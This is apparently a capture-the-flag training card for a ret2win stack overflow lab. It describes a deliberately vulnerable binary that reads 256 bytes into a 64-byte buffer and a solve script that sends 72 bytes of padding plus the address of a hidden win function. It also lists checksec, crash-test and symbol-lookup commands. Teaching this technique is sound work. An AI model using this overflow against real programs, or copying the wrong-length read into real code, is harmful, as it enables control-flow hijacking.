### Ret2Canteen - Boss: Overflow to Win

`/challenge/vuln` has a 64B buffer, `read(0,buf,256)`, and a hidden `win()` that prints `/flag`. No source needed, but `vuln.c` is provided for teaching.

```bash
checksec --file=vuln || file vuln
python3 -c "print('A'*100)" | ./vuln
/usr/bin/python3 /challenge/solve.py
```

`solve.py` sends `72xA + win_addr`. Find `win` with `nm vuln | grep win` or `objdump -t`. This is 50% of real pwn: overflow RIP -> ret2win. Talk: stack, RIP, why `read` with wrong length kills.

First team to print `WIN:` wins showdown.
